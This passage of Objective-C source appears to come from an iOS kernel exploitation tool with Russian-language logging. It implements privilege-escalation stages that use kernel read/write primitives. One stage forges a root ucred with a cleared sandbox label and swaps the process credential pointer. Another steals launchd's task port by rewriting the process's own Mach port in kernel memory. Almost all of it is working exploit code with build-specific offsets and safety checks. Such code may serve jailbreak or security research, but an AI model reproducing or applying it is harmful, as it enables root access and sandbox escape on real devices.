        map = kp_untag_ptr(map);
        if (!kpLooksLikeKernelPointer(map)) { [r appendString:@"FAIL: map\n"]; return r; }
        if (!kpRead(map + koffsetof(vm_map, pmap), &pmap, sizeof(pmap), "vm_map.pmap", r)) return r;
        pmap = kp_untag_ptr(pmap);
        if (!kpLooksLikeKernelPointer(pmap)) { [r appendString:@"FAIL: pmap\n"]; return r; }
        if (!kpRead(pmap + koffsetof(pmap, ttep), &ttep, sizeof(ttep), "pmap.ttep", r)) return r;
        ttep = kp_untag_ptr(ttep);
        kpNote(r, [NSString stringWithFormat:@"  цепь: task=%#llx map=%#llx pmap=%#llx ttep=%#llx",
                  (unsigned long long)task, (unsigned long long)map,
                  (unsigned long long)pmap, (unsigned long long)ttep]);

        // our page's physical address via OUR pmap, then its kernel VA.
        // 1.9.4: through the real ptov_table (phystokv), NOT the linear
        // formula — on A17 the physmap is NOT linear from physBase, and the
        // formula produced an unmapped VA (kvtophys=0, readback garbage).
        uint64_t pa = vtophys(ttep, (uint64_t)page);
        if (!pa) {
            [r appendString:@"FAIL: vtophys нашей страницы = 0 (не замаплена?)\n"];
            return r;
        }
        uint64_t forgeKVA = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
        kpNote(r, [NSString stringWithFormat:@"  страница: userVA=%#llx pa=%#llx → kernel VA (ptov)=%#llx",
                  (unsigned long long)page, (unsigned long long)pa, (unsigned long long)forgeKVA]);
        if (!kpLooksLikeKernelPointer(forgeKVA)) {
            // fallback: the linear physmap guess, so the log shows both
            uint64_t lin = kconstant(virtBase) + (pa - kconstant(physBase));
            kpNote(r, [NSString stringWithFormat:@"  ptov дал 0 — линейная оценка: %#llx", (unsigned long long)lin]);
            [r appendString:@"FAIL: phystokv не дал kernel VA для страницы\n"];
            return r;
        }

        // sanity: read the forge back THROUGH the kernel VA
        uint64_t probe = 0;
        if (kpRead(forgeKVA, &probe, sizeof(probe), "forge readback", r)) {
            kpNote(r, [NSString stringWithFormat:@"  чтение форжа по kernel VA: %#llx (ждём начало скопированного ucred)", (unsigned long long)probe]);
        }

        // the swap: one 8-byte heap write into proc_ro (RW — written by fork)
        static uint64_t sOrigUcred = 0;
        sOrigUcred = curUcred;
        kpNote(r, [NSString stringWithFormat:@"  оригинальный p_ucred = 0x%016llx", (unsigned long long)sOrigUcred]);
        kwritebuf(ucredSlot, &forgeKVA, sizeof(forgeKVA));
        uint64_t rbRaw = 0;
        kpRead(ucredSlot, &rbRaw, sizeof(rbRaw), "p_ucred readback", r);
        uint64_t rb = kp_untag_ptr(rbRaw);
        kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
                  (unsigned long long)rb, (unsigned long long)forgeKVA]);
        if (rb != forgeKVA) {
            [r appendString:@"FAIL: подмена не прилипла — kwrite по proc_ro не работает\n"];
            return r;
        }

        uid_t newUid = getuid();
        gid_t newGid = getgid();
        kpNote(r, [NSString stringWithFormat:@"  после подмены: getuid()=%d getgid()=%d", newUid, newGid]);

        const char *probePath = "/private/var/root/kexproof-e9-probe.txt";
        errno = 0;
        FILE *f = fopen(probePath, "w");
        if (f) {
            fputs("kexproof e9\n", f);
            fclose(f);
            unlink(probePath);
            [r appendString:@"  /private/var/root: запись УДАЛАСЬ — sandbox не держит (label очищен)\n"];
        } else {
            kpNote(r, [NSString stringWithFormat:@"  /private/var/root: %s — uid root, но sandbox ещё действует", strerror(errno)]);
        }

        if (newUid == 0) {
            [r appendString:@"\n=== EXP-09 PASS: uid 0 (root) через pointer-swap на physmap-форж ===\n"];
            [r appendString:@"Форж в нашей wired-странице (не free). До ребута мы root.\n"];
        } else {
            [r appendString:@"\n=== EXP-09 FAIL: указатель подменён, но getuid() не 0 ===\n"];
        }
        return r;
    }

    // 3. Forge a ucred copy in a pipe buffer — XNU_DEFAULT heap we own. The
    //    pipe is never closed: the forged object stays permanent (spec §3).
    static int sForgePipe[2] = { -1, -1 };
    if (sForgePipe[0] < 0) {
        if (pipe(sForgePipe) != 0) {
            [r appendString:@"FAIL: pipe()\n"];
            return r;
        }
    }

    static const uint8_t kForgeMagic[16] = { 'K','P','R','C','R','E','D','1','K','P','R','C','R','E','D','1' };
    uint8_t forge[16 + 0x120];
    memset(forge, 0, sizeof(forge));
    memcpy(forge, kForgeMagic, sizeof(kForgeMagic));
    memcpy(forge + 16, realCred, sizeof(realCred));
    memset(forge + 16 + 0x18, 0, 12);  // cr_uid / cr_ruid / cr_svuid = 0
    memset(forge + 16 + 0x28, 0, 4);   // cr_groups[0] (primary gid) = 0
    memset(forge + 16 + 0x68, 0, 8);   // cr_rgid / cr_svgid = 0
    memset(forge + 16 + 0x78, 0, 8);   // cr_label = NULL — cleared MAC label
    uint32_t ref = 0;
    memcpy(&ref, realCred + 0x10, sizeof(ref));
    ref += 0x1000;                     // refcount bump: exit-time unref never frees
    memcpy(forge + 16 + 0x10, &ref, sizeof(ref));

    ssize_t wr = write(sForgePipe[1], forge, sizeof(forge));
    if (wr != (ssize_t)sizeof(forge)) {
        [r appendString:@"FAIL: write в pipe\n"];
        return r;
    }

    // 4. Find the pipe buffer's kernel VA via our own fd table, then confirm
    //    by the magic header (no pipe-layout offsets hardcoded).
    uint64_t fdPtr = 0;
    kpRead(selfProc + koffsetof(proc, fd), &fdPtr, sizeof(fdPtr), "proc.fd", r);
    uint64_t fdTable = kp_untag_ptr(fdPtr);
    uint64_t ofilesVA = fdTable + 0x28; // filedesc.ofiles_start (16+ ladder)
    kpNote(r, [NSString stringWithFormat:@"  fd table=0x%016llx ofiles=0x%016llx wfd=%d",
              (unsigned long long)fdTable, (unsigned long long)ofilesVA, sForgePipe[1]]);

    uint64_t fpRaw = 0, globRaw = 0, dataRaw = 0;
    kpRead(ofilesVA + (uint64_t)sForgePipe[1] * 8, &fpRaw, sizeof(fpRaw), "ofiles[wfd]", r);
    uint64_t fileprocVA = kp_untag_ptr(fpRaw);
    kpRead(fileprocVA + 0x10, &globRaw, sizeof(globRaw), "fileproc.glob", r);
    uint64_t globVA = kp_untag_ptr(globRaw);
    kpRead(globVA + 0x38, &dataRaw, sizeof(dataRaw), "fileglob.data", r);
    uint64_t pipeVA = kp_untag_ptr(dataRaw);
    kpNote(r, [NSString stringWithFormat:@"  fileproc=0x%016llx glob=0x%016llx pipe=0x%016llx",
              (unsigned long long)fileprocVA, (unsigned long long)globVA, (unsigned long long)pipeVA]);
    if (!kpLooksLikeKernelPointer(pipeVA)) {
        [r appendString:@"FAIL: pipe struct не найден по fd-таблице\n"];
        return r;
    }

    uint64_t bufferVA = 0;
    uint8_t pipeWin[0x100];
    memset(pipeWin, 0, sizeof(pipeWin));
    kpRead(pipeVA, pipeWin, sizeof(pipeWin), "pipe struct", r);
    for (int off = 0; off + 8 <= (int)sizeof(pipeWin) && !bufferVA; off += 8) {
        uint64_t q = 0;
        memcpy(&q, pipeWin + off, 8);
        uint64_t cand = kp_untag_ptr(q);
        if (!kpLooksLikeKernelPointer(cand)) continue;
        uint8_t probe[16];
        memset(probe, 0, sizeof(probe));
        if (!kpRead(cand, probe, sizeof(probe), "pipe buf candidate", r)) continue;
        if (memcmp(probe, kForgeMagic, 16) == 0) {
            bufferVA = cand;
        }
    }
    if (!bufferVA) {
        [r appendString:@"FAIL: буфер pipe не найден по магии KPRCRED1\n"];
        return r;
    }
    uint64_t forgedUcredVA = bufferVA + 16;
    kpNote(r, [NSString stringWithFormat:@"  буфер pipe=0x%016llx → forged ucred=0x%016llx",
              (unsigned long long)bufferVA, (unsigned long long)forgedUcredVA]);

    // 5. Writability pre-filter (spec §0): the pages we touch must be heap
    //    type. proc_ro is written by fork, so it must be XNU_DEFAULT.
    if (gFrameTableVA) {
        int tRo = -1, tBuf = -1;
        uint64_t pa = kvtophys(procRo);
        if (pa) tRo = kpFrameTypeOfPALogged(gFrameTableVA, pa, r);
        pa = kvtophys(bufferVA);
        if (pa) tBuf = kpFrameTypeOfPALogged(gFrameTableVA, pa, r);
        kpNote(r, [NSString stringWithFormat:@"  типы фреймов: proc_ro=%@ forge=%@ (heap=0x%02x)",
                  tRo < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tRo],
                  tBuf < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tBuf],
                  gHeapFrameType]);
        if (gHeapTypeKnown && ((tRo >= 0 && tRo != gHeapFrameType) || (tBuf >= 0 && tBuf != gHeapFrameType))) {
            [r appendString:@"FAIL: proc_ro или буфер НЕ heap-типа (RO-зона) — запись отменена до паники\n"];
            return r;
        }
    }
    else {
        [r appendString:@"  оракул типов недоступен — продолжаю без предфильтра (proc_ro пишется форком → обычная зона)\n"];
    }

    // 6. The swap: one 8-byte heap write. Original pointer saved for manual
    //    restore; never auto-restored (forged object must stay alive).
    static uint64_t sOrigUcred = 0;
    sOrigUcred = curUcred;
    kpNote(r, [NSString stringWithFormat:@"  оригинальный p_ucred = 0x%016llx (сохранён в лог; не восстанавливается)",
              (unsigned long long)sOrigUcred]);

    kwritebuf(ucredSlot, &forgedUcredVA, sizeof(forgedUcredVA));
    uint64_t rbRaw = 0;
    kpRead(ucredSlot, &rbRaw, sizeof(rbRaw), "p_ucred readback", r);
    uint64_t rb = kp_untag_ptr(rbRaw);
    kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
              (unsigned long long)rb, (unsigned long long)forgedUcredVA]);
    if (rb != forgedUcredVA) {
        [r appendString:@"FAIL: подмена не прилипла — kwrite по proc_ro не работает\n"];
        return r;
    }

    // 7. Verify.
    uid_t newUid = getuid();
    gid_t newGid = getgid();
    kpNote(r, [NSString stringWithFormat:@"  после подмены: getuid()=%d getgid()=%d", newUid, newGid]);

    const char *probePath = "/private/var/root/kexproof-e9-probe.txt";
    errno = 0;
    FILE *f = fopen(probePath, "w");
    if (f) {
        fputs("kexproof e9\n", f);
        fclose(f);
        unlink(probePath);
        [r appendString:@"  /private/var/root: запись УДАЛАСЬ — sandbox не держит (label очищен)\n"];
    }
    else {
        kpNote(r, [NSString stringWithFormat:@"  /private/var/root: %s — uid уже root, но sandbox ещё действует (MAC label кеширован?)", strerror(errno)]);
    }

    if (newUid == 0) {
        [r appendString:@"\n=== EXP-09 PASS: uid 0 через heap-only pointer-swap. Записей в защищённую память не было. ===\n"];
        [r appendString:@"Форг живёт в pipe-буфере (fd'шки намеренно утёкшие). До перезагрузки мы root.\n"];
    }
    else {
        [r appendString:@"\n=== EXP-09 FAIL: указатель подменён, но getuid() не 0 — credential кешируется где-то ещё ===\n"];
    }
    return r;
}

#pragma mark - E10: task-port theft (sandbox escape via data-only heap write)

// io_bits layout is build-dependent. Field data (iPhone 15 Pro, 18.6): a
// legit task port has io_bits=0x80000002 — kotype IKOT_TASK(2) in the LOW
// bits, active in bit 31, NOT the classic 0x0FFF0000 window. So E10 never
// parses or synthesizes io_bits: the victim port gets the VERBATIM io_bits of
// our own real task port — a valid task-port template on this build by
// definition. (Macro kept for an informational low-12 decode in logs only.)
#define KP_IO_BITS_KOTYPE_LOW 0x00000FFFu
#define KP_IKOT_TASK          2u

// kutils.m implements the engine-side itk_space walk but its header only
// exports task_get_ipc_port_kobject. Declared here as an independent
// cross-check of the manually logged walk below.
extern uint64_t task_get_ipc_port_object(uint64_t task, mach_port_t port);

// Verbatim port of the exploit engine's kread_smrptr (krw.m:139), applied to
// the RAW qword. is_table is SMR-encoded, NOT PAC-tagged: a kp_untag_ptr
// before the decode destroys the SMR tag bits (field data, this boot:
// raw 0x27cdbfe834a9c02a → formula → 0x27cdffe834a9c000 → caller applies the
// 47-bit sign extension → canonical 0xffffffe834a9c000). Constants come from
// the offsets.m ladder (smr_base=2, t1sz_boot=0x11 on A17 Pro / iOS 18.x).
static uint64_t kpSMRDecode(uint64_t value)
{
    uint64_t bits = (smr_base << (62 - t1sz_boot));
    if ((value & bits) == 0) {
        return ((value & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
    }
    return (value & 0xFFFFFFFFFFFFFFE0ULL);
}

+ (NSString *)taskPortTheftReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== E10: task-port theft → launchd (data-only heap write) ===\n"];
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }

    // All locals up front: the failure path is a single goto label that
    // destroys the port, so no ARC-scoped object declarations past this point.
    mach_port_t stolen = MACH_PORT_NULL;
    kern_return_t kr = KERN_SUCCESS, krBefore = KERN_SUCCESS, krAfter = KERN_SUCCESS;
    kern_return_t krReg = KERN_SUCCESS, krRd = KERN_SUCCESS;
    pid_t probePid = -1, gotPid = -1;
    uint64_t selfTask = 0, selfProc = 0;
    uint64_t spaceRaw = 0, itkSpace = 0, tableRaw = 0, table = 0;
    uint64_t entryVA = 0, objRaw = 0, ourPortVA = 0, xcheck = 0;
    uint64_t launchdProc = 0, launchdProcRo = 0, launchdTask = 0;
    uint64_t roRaw = 0, tRaw = 0, mapRaw = 0, selfTaskPortObj = 0;
    uint64_t tRaw2 = 0, lspaceRaw = 0, launchdMap = 0, launchdSpace = 0;
    uint64_t ioSlot = 0, kobjSlot = 0, origKobjRaw = 0, rb64 = 0;
    uint32_t origIoBits = 0, newIoBits = 0, rb32 = 0;
    uint32_t realIoBits = 0, kobjOff = 0;
    int foundOff = -1;
    BOOL didSteal = NO, restored = NO, pidOK = NO, regionOK = NO, readOK = NO;
    char commBuf[33];
    uint8_t portHdr[0x60], realHdr[0x60];
    mach_vm_address_t raddr = 0;
    mach_vm_size_t rsize = 0, want = 0;
    vm_region_basic_info_data_64_t regInfo;
    mach_msg_type_number_t icnt = VM_REGION_BASIC_INFO_COUNT_64, dataCnt = 0;
    mach_port_t objName = MACH_PORT_NULL;
    vm_offset_t dataOut = 0;

    kpNote(r, [NSString stringWithFormat:@"  лестница: task.itk_space=+0x%x · ipc_space.is_table=+0x%x · sizeof(ipc_entry)=0x%x · ipc_entry.ie_object=+0x%x · ipc_port.ip_kobject=+0x%x · proc.proc_ro=+0x%x · proc.pid=+0x%x · proc.p_name=+0x%x · proc_ro.pr_task=+0x%x",
              off_task_itk_space, off_ipc_space_is_table, sizeof_ipc_entry,
              off_ipc_entry_ie_object, off_ipc_port_ip_kobject,
              off_proc_p_proc_ro, off_proc_p_pid, off_proc_p_name, off_proc_ro_pr_task]);

    // 1. Sacrificial port: receive right, then a send right on the same name —
    //    task-port MIG calls (pid_for_task, mach_vm_*) resolve the name via a
    //    SEND right entry.
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &stolen);
    if (kr != KERN_SUCCESS) {
        [r appendFormat:@"FAIL: mach_port_allocate: %s\n", mach_error_string(kr)];
        return r;
    }
    kr = mach_port_insert_right(mach_task_self(), stolen, stolen, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_destroy(mach_task_self(), stolen);
        [r appendFormat:@"FAIL: mach_port_insert_right: %s\n", mach_error_string(kr)];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"  наш порт: name=0x%x (recv+send), table index=0x%x",
              (unsigned)stolen, (unsigned)(stolen >> 8)]);

    // Control BEFORE: a vanilla port is not a task port.
    krBefore = pid_for_task(stolen, &probePid);
    kpNote(r, [NSString stringWithFormat:@"  контроль ДО подмены: pid_for_task → %s (pid=%d) — ждём отказ",
              mach_error_string(krBefore), (int)probePid]);

    // 2. Our task VA (engine-cached after the win; fallback — proc chain).
    selfTask = task_self();
    kpNote(r, [NSString stringWithFormat:@"  наш task (task_self): 0x%016llx", (unsigned long long)selfTask]);
    if (!kpLooksLikeKernelPointer(selfTask)) {
        selfProc = proc_self();
        if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
        if (selfProc &&
            kpRead(selfProc + off_proc_p_proc_ro, &roRaw, sizeof(roRaw), "proc.proc_ro", r) &&
            kpRead(kp_untag_ptr(roRaw) + off_proc_ro_pr_task, &tRaw, sizeof(tRaw), "proc_ro.pr_task", r)) {
            selfTask = kp_untag_ptr(tRaw);
            kpNote(r, [NSString stringWithFormat:@"  наш task (proc-цепь): 0x%016llx", (unsigned long long)selfTask]);
        }
    }
    if (!kpLooksLikeKernelPointer(selfTask)) {
        [r appendString:@"FAIL: свой task не найден\n"];
        goto e10fail;
    }

    // 3. itk_space walk to our port's ipc_port VA:
    //    task → itk_space → is_table (SMR на 16.1+) → entry[name>>8] → ie_object.
    if (!kpRead(selfTask + off_task_itk_space, &spaceRaw, sizeof(spaceRaw), "task.itk_space", r)) goto e10fail;
    itkSpace = kp_untag_ptr(spaceRaw);
    kpNote(r, [NSString stringWithFormat:@"  itk_space: raw=0x%016llx → 0x%016llx",
              (unsigned long long)spaceRaw, (unsigned long long)itkSpace]);
    if (!kpLooksLikeKernelPointer(itkSpace)) {
        [r appendString:@"FAIL: itk_space не kernel-указатель\n"];
        goto e10fail;
    }

    if (!kpRead(itkSpace + off_ipc_space_is_table, &tableRaw, sizeof(tableRaw), "ipc_space.is_table", r)) goto e10fail;
    if (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot) {
        // SMR-поле читается СЫРЫМ и декодируется без предварительного untag —
        // kp_untag_ptr до формулы сносит теговые биты и ломает декод (проверено
        // на железе). Формула отдаёт 47-битное значение с тегом в старших
        // битах; kp_untag_ptr ПОСЛЕ декода канонизирует его в kernel VA.
        uint64_t bits = (smr_base << (62 - t1sz_boot));
        uint64_t dec = kpSMRDecode(tableRaw);
        table = kp_untag_ptr(dec);
        kpNote(r, [NSString stringWithFormat:@"  is_table (SMR): raw=0x%016llx · bits=0x%016llx (smr_base=%llu t1sz=%llu) → decode=0x%016llx → canon=0x%016llx",
                  (unsigned long long)tableRaw, (unsigned long long)bits,
                  (unsigned long long)smr_base, (unsigned long long)t1sz_boot,
                  (unsigned long long)dec, (unsigned long long)table]);
    }
    else {
        table = kp_untag_ptr(tableRaw);
        kpNote(r, [NSString stringWithFormat:@"  is_table (не SMR): raw=0x%016llx → 0x%016llx (uses_smr=%d smr_base=%llu t1sz=%llu)",
                  (unsigned long long)tableRaw, (unsigned long long)table,
                  (int)koffsetof(ipc_space, table_uses_smr),
                  (unsigned long long)smr_base, (unsigned long long)t1sz_boot]);
    }
    if (!kpLooksLikeKernelPointer(table)) {
        [r appendString:@"FAIL: is_table не kernel-указатель\n"];
        goto e10fail;
    }

    entryVA = table + (uint64_t)sizeof_ipc_entry * (stolen >> 8);
    kpNote(r, [NSString stringWithFormat:@"  entry[0x%x] @ 0x%016llx (table 0x%016llx + 0x%x*index)",
              (unsigned)(stolen >> 8), (unsigned long long)entryVA, (unsigned long long)table, sizeof_ipc_entry]);
    if (!kpRead(entryVA + off_ipc_entry_ie_object, &objRaw, sizeof(objRaw), "ipc_entry.ie_object", r)) goto e10fail;
    ourPortVA = kp_untag_ptr(objRaw);
    kpNote(r, [NSString stringWithFormat:@"  ie_object: raw=0x%016llx → наш ipc_port VA = 0x%016llx",
              (unsigned long long)objRaw, (unsigned long long)ourPortVA]);
    if (!kpLooksLikeKernelPointer(ourPortVA)) {
        [r appendString:@"FAIL: ie_object не kernel-указатель\n"];
        goto e10fail;
    }

    // Independent cross-check through the engine's own walk (kutils.m).
    xcheck = task_get_ipc_port_object(selfTask, stolen);
    kpNote(r, [NSString stringWithFormat:@"  cross-check task_get_ipc_port_object: 0x%016llx — %@",
              (unsigned long long)xcheck,
              xcheck == ourPortVA ? @"СОВПАЛО" : @"РАСХОДИТСЯ — работаю по ручному walk'у, осторожно"]);

    // 4. launchd: pid 1 — ТОЛЬКО fast pid-walk. findProcByPid / proc_find /
    //    zone-маршрут намеренно отключены: zone-маршрут — это тысячи gated
    //    чтений и zone-guard паника (ребут на железе), полный gated walk —
    //    та же цена. Не нашёл — честный FAIL, ядро цело.
    launchdProc = [self findSelfProcByPidFast:1 log:r];
    if (!launchdProc) {
        [r appendString:@"FAIL: launchd (pid 1) не найден fast walk'ом — счётчик узлов в логе выше. Опасные fallback'и (findProcByPid / proc_find / zone-маршрут) отключены намеренно.\n"];
        goto e10fail;
    }

    memset(commBuf, 0, sizeof(commBuf));
    if (kpRead(launchdProc + off_proc_p_name, commBuf, 32, "launchd comm", r)) {
        kpNote(r, [NSString stringWithFormat:@"  comm pid 1: \"%s\" (ждём launchd)", commBuf]);
        if (strncmp(commBuf, "launchd", 7) != 0) {
            kpNote(r, @"  ВНИМАНИЕ: comm не launchd — pid-оффсет под вопросом, продолжаю (решает readback)");
        }
    }

    if (!kpRead(launchdProc + off_proc_p_proc_ro, &roRaw, sizeof(roRaw), "launchd proc.proc_ro", r)) goto e10fail;
    launchdProcRo = kp_untag_ptr(roRaw);
    kpNote(r, [NSString stringWithFormat:@"  launchd proc_ro: raw=0x%016llx → 0x%016llx",
              (unsigned long long)roRaw, (unsigned long long)launchdProcRo]);
    if (!kpLooksLikeKernelPointer(launchdProcRo)) {
        [r appendString:@"FAIL: launchd proc_ro не kernel-указатель\n"];
        goto e10fail;
    }
    // Отсюда и до конца КАЖДОЕ чтение идёт по вычисленному адресу — требуем,
    // чтобы unmapped-гейт kpRead был вооружён. Иначе kpRead деградирует до
    // голого kreadbuf по любому мусорному базису — именно так умер ребут #3
    // (data abort, far=0x0000a62f00000018: двойной dereference мусорного
    // launchdTask ядром при MIG-верификации). Лучше честный FAIL, чем паника.
    if (!gCpuTtepVA && !gCpuTtepPhys) {
        [r appendString:@"FAIL: translation-гейт не поднят (gCpuTtepVA/gCpuTtepPhys == 0) — чтения по launchd-цепочке пошли бы безгейтово, стоп до паники\n"];
        goto e10fail;
    }

    // pr_task: двойное чтение с голосованием. Одиночный прогон может вернуть
    // мусор, который ПРОЙДЁТ kernel-pointer check (0xffffff...-образный) и
    // убьёт ядро позже — в pid_for_task/mach_vm_* на подменённом порту.
    if (!kpRead(launchdProcRo + off_proc_ro_pr_task, &tRaw, sizeof(tRaw), "launchd proc_ro.pr_task", r)) goto e10fail;
    if (!kpRead(launchdProcRo + off_proc_ro_pr_task, &tRaw2, sizeof(tRaw2), "launchd proc_ro.pr_task (повтор)", r)) goto e10fail;
    launchdTask = kp_untag_ptr(tRaw);
    kpNote(r, [NSString stringWithFormat:@"  launchd task_t: raw=0x%016llx повтор=0x%016llx → 0x%016llx%@",
              (unsigned long long)tRaw, (unsigned long long)tRaw2, (unsigned long long)launchdTask,
              tRaw == tRaw2 ? @"" : @" — НЕСТАБИЛЬНО!"]);
    if (tRaw != tRaw2) {
        [r appendString:@"FAIL: pr_task нестабилен между двумя чтениями — каналу нет доверия, стоп\n"];
        goto e10fail;
    }
    if (!kpLooksLikeKernelPointer(launchdTask) || (launchdTask & 0xF)) {
        [r appendFormat:@"FAIL: launchd task_t не похож на zone-объект (0x%016llx, выравнивание %s) — стоп до паники\n",
            (unsigned long long)launchdTask, (launchdTask & 0xF) ? "кривое" : "ок"];
        goto e10fail;
    }
    if (launchdTask == selfTask) {
        [r appendString:@"FAIL: launchd task_t == наш собственный task — цепочка замкнулась на себя, стоп\n"];
        goto e10fail;
    }

    // Sanity-дерефы настоящего task: map и itk_space у реального task_t —
    // валидные kernel-указатели. Оба чтения gated (kpRead), оба результата
    // ФАТАЛЬНЫ при несовпадении — это последний рубеж перед тем, как отдать
    // launchdTask ядру через подменённый порт.
    if (!kpRead(launchdTask + off_task_map, &mapRaw, sizeof(mapRaw), "launchd task.map", r)) goto e10fail;
    launchdMap = kp_untag_ptr(mapRaw);
    kpNote(r, [NSString stringWithFormat:@"  sanity: launchd task.map raw=0x%016llx → 0x%016llx",
              (unsigned long long)mapRaw, (unsigned long long)launchdMap]);
    if (!kpLooksLikeKernelPointer(launchdMap)) {
        [r appendFormat:@"FAIL: launchd task.map не kernel-указатель (0x%016llx) — launchdTask невалиден, стоп до паники\n",
            (unsigned long long)launchdMap];
        goto e10fail;
    }
    if (!kpRead(launchdTask + off_task_itk_space, &lspaceRaw, sizeof(lspaceRaw), "launchd task.itk_space", r)) goto e10fail;
    launchdSpace = kp_untag_ptr(lspaceRaw);
    kpNote(r, [NSString stringWithFormat:@"  sanity: launchd task.itk_space raw=0x%016llx → 0x%016llx",
              (unsigned long long)lspaceRaw, (unsigned long long)launchdSpace]);
    if (!kpLooksLikeKernelPointer(launchdSpace)) {
        [r appendFormat:@"FAIL: launchd task.itk_space не kernel-указатель (0x%016llx) — launchdTask невалиден, стоп до паники\n",
            (unsigned long long)launchdSpace];
        goto e10fail;
    }
    kpNote(r, [NSString stringWithFormat:@"  launchd task_t 0x%016llx прошёл все проверки (map + itk_space валидны)",
              (unsigned long long)launchdTask]);

    // 5. Oracle на нашем НАСТОЯЩЕМ task-port — теперь фатальный. Ребут #4
    //    показал: подмена по слепой лестнице оффсетов может дать порт, который
    //    ядро не признаёт (pid_for_task → KERN_FAILURE) или признаёт криво
    //    (mach_vm_* по мусору). Поэтому до подмены читаем легальный task port
    //    целиком: (a) калибруем, в КАКОМ qword заголовка реально лежит
    //    selfTask — если не в +0x48, оффсет для этого билда другой, и мы либо
    //    находим его сканом, либо стоп; (b) снимаем io_bits-шаблон легального
    //    task port (kotype + любые новые флаги билда в старших 16 битах).
    selfTaskPortObj = task_get_ipc_port_object(selfTask, mach_task_self());
    if (!kpLooksLikeKernelPointer(selfTaskPortObj)) {
        [r appendString:@"FAIL: не нашли VA собственного task port — стоп до подмены\n"];
        goto e10fail;
    }
    memset(realHdr, 0, sizeof(realHdr));
    if (!kpRead(selfTaskPortObj, realHdr, sizeof(realHdr), "self task-port hdr", r)) goto e10fail;
    memcpy(&realIoBits, realHdr, sizeof(realIoBits));
    // Никакого парсинга и никакой фатальной проверки kotype: значение io_bits
    // настоящего task port — это и есть шаблон, пишется дословно. (Полевые
    // данные 18.6/A17 Pro: 0x80000002 — kotype IKOT_TASK в младших битах.)
    kpNote(r, [NSString stringWithFormat:@"  настоящий task-port @ 0x%016llx: io_bits=0x%08x (low12=%u active=%u) — шаблон, пишется дословно",
                  (unsigned long long)selfTaskPortObj, realIoBits,
                  realIoBits & KP_IO_BITS_KOTYPE_LOW, (realIoBits >> 31) & 1]);

    kobjOff = off_ipc_port_ip_kobject;
    {
        uint64_t cand = 0;
        memcpy(&cand, realHdr + kobjOff, sizeof(cand));
        if (kp_untag_ptr(cand) == selfTask) {
            kpNote(r, [NSString stringWithFormat:@"  oracle: ip_kobject @ +0x%x == selfTask — оффсет верен", kobjOff]);
        }
        else {
            kpNote(r, [NSString stringWithFormat:@"  oracle: @ +0x%x лежит 0x%016llx, а не selfTask — сканирую заголовок порта…",
                      kobjOff, (unsigned long long)kp_untag_ptr(cand)]);
            for (uint32_t off = 0x8; off + 8 <= sizeof(realHdr); off += 8) {
                uint64_t q = 0;
                memcpy(&q, realHdr + off, sizeof(q));
                if (kp_untag_ptr(q) == selfTask) { foundOff = (int)off; break; }
            }
            if (foundOff < 0) {
                [r appendString:@"FAIL: в первых 0x60 байтах настоящего task port нет selfTask — структура ipc_port другая, стоп до паники\n"];
                goto e10fail;
            }
            kobjOff = (uint32_t)foundOff;
            kpNote(r, [NSString stringWithFormat:@"  oracle: ip_kobject скорректирован: +0x%x → +0x%x (selfTask лежит там)",
                      off_ipc_port_ip_kobject, kobjOff]);
        }
    }

    // 6. Baseline of OUR port, then the theft. Write order: kobject first,
    //    kotype flip second — нет момента, когда task-kotype порт держит
    //    NULL/garbage kobject.
    ioSlot   = ourPortVA; // ipc_object.io_bits @ +0
    kobjSlot = ourPortVA + kobjOff; // оффсет откалиброван оракулом выше
    if (!kpRead(ioSlot, &origIoBits, sizeof(origIoBits), "ourPort io_bits", r)) goto e10fail;
    if (!kpRead(kobjSlot, &origKobjRaw, sizeof(origKobjRaw), "ourPort ip_kobject", r)) goto e10fail;
    kpNote(r, [NSString stringWithFormat:@"  наш ipc_port @ 0x%016llx: io_bits=0x%08x (low12=%u active=%u), ip_kobject raw=0x%016llx",
              (unsigned long long)ourPortVA, origIoBits,
              origIoBits & KP_IO_BITS_KOTYPE_LOW, (origIoBits >> 31) & 1,
              (unsigned long long)origKobjRaw]);
    kpNote(r, [NSString stringWithFormat:@"  сохранено для restore: io_bits=0x%08x · ip_kobject=0x%016llx",
              origIoBits, (unsigned long long)origKobjRaw]);

    // io_bits жертвы = ДОСЛОВНО io_bits настоящего task port (все 32 бита).
    // Никакой сборки из констант: шаблон валиден на этом билде по определению.
    newIoBits = realIoBits;
    kpNote(r, [NSString stringWithFormat:@"  io_bits: наш=0x%08x · шаблон task port=0x%08x → пишем дословно 0x%08x",
              origIoBits, realIoBits, newIoBits]);
    kpNote(r, [NSString stringWithFormat:@"  кража: ПИШЕМ ТОЛЬКО В НАШ ПОРТ — io_bits @ 0x%016llx ← 0x%08x (дословная копия io_bits настоящего task port) · ip_kobject @ 0x%016llx ← 0x%016llx (launchd task_t; сам launchd task не пишется)",
              (unsigned long long)ioSlot, newIoBits,
              (unsigned long long)kobjSlot, (unsigned long long)launchdTask]);
    kwritebuf(kobjSlot, &launchdTask, sizeof(launchdTask));
    kwritebuf(ioSlot, &newIoBits, sizeof(newIoBits));

    kpRead(kobjSlot, &rb64, sizeof(rb64), "ip_kobject readback", r);
    kpRead(ioSlot, &rb32, sizeof(rb32), "io_bits readback", r);
    kpNote(r, [NSString stringWithFormat:@"  readback: ip_kobject=0x%016llx (ждём 0x%016llx) · io_bits=0x%08x (ждём 0x%08x)",
              (unsigned long long)rb64, (unsigned long long)launchdTask, rb32, newIoBits]);
    if (kp_untag_ptr(rb64) != launchdTask || rb32 != newIoBits) {
        [r appendString:@"FAIL: подмена не прилипла — kwrite по ipc ports zone не работает? Откатываю.\n"];
